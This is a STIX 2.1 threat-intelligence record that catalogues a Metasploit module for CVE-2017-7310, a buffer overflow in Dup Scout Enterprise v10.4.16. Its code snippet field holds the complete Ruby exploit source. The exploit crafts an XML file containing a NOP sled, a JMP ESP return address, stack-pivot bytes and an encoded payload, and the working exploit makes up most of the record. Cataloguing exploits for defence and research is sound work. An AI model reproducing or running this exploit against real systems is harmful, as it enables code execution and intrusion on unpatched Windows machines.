{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ca7eb56-cc28-4e35-9adf-b8f402741500",
    "created": "2024-08-14T16:36:05.384429Z",
    "modified": "2024-08-14T16:36:05.384433Z",
    "name": "Dup Scout Enterprise v10.4.16 - Import Command Buffer Overflow",
    "description": "( This module exploits a buffer overflow in Dup Scout Enterprise v10.4.16 by using the import command option to import a specially crafted xml file. ) 'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/dupscout_xml.rb",
            "external_id": "dupscout_xml.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-7310"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'            => 'Dup Scout Enterprise v10.4.16 - Import Command Buffer Overflow',\n      'Description'     => %q(\n        This module exploits a buffer overflow in Dup Scout Enterprise v10.4.16\n        by using the import command option to import a specially crafted xml file.\n      ),\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Daniel Teixeira'\n        ],\n      'References'      =>\n        [\n          [ 'CVE', '2017-7310' ]\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'seh',\n          'DisablePayloadHandler' => true\n        },\n      'Platform'        => 'win',\n      'Payload'         =>\n        {\n          'BadChars' => \"\\x27\",\n          'StackAdjustment' => -3500\n        },\n      'Targets'         =>\n        [\n          ['Windows Universal', { 'Ret' => 0x651BB77A  } ] # JMP ESP [QtGui4.dll]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2017-03-29',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [true, 'The file name.', 'msf.xml'])\n      ])\n  end\n\n  def exploit\n    esp = \"\\x8d\\x44\\x24\\x14\" #LEA EAX, [ESP+14h]\n    jmp = \"\\xff\\xe0\" # JMP EAX\n\n    buf = \"<?xml ?><a name='\"\n    buf << make_nops(1560)\n    buf << [target.ret].pack('V')\n    buf << make_nops(16)\n    buf << esp\n    buf << jmp\n    buf << make_nops(14)\n    buf << payload.encoded\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(buf)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-29",
    "x_mitre_platforms": [
        "win'"
    ]
}